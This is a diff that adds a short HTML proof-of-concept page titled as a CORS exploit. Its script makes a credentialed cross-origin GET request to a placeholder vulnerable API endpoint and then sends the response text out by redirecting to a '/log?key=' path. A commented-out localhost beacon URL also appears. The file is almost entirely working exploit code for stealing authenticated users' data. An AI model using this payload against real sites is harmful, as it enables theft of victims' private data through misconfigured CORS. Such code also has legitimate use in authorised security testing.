@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CORS Exploit PoC - GET Request</h1>
+    <button id="exploit">Run Exploit</button>
+    <script>
+      	// Target vulnerable endpoint
+      	var vulnPage = "https://vulnerable-site.com/api/endpoint";
+	//var beaconUrl = "http://localhost:81/log?data=";
+
+    	var req = new XMLHttpRequest();
+    	req.onload = reqListener;
+    	req.open('get',vulnPage,true);
+    	req.withCredentials = true;
+    	req.send();
+
+    	function reqListener() {
+		location='/log?key='+this.responseText;
+    	};
+    </script>
+  </body>
+</html>
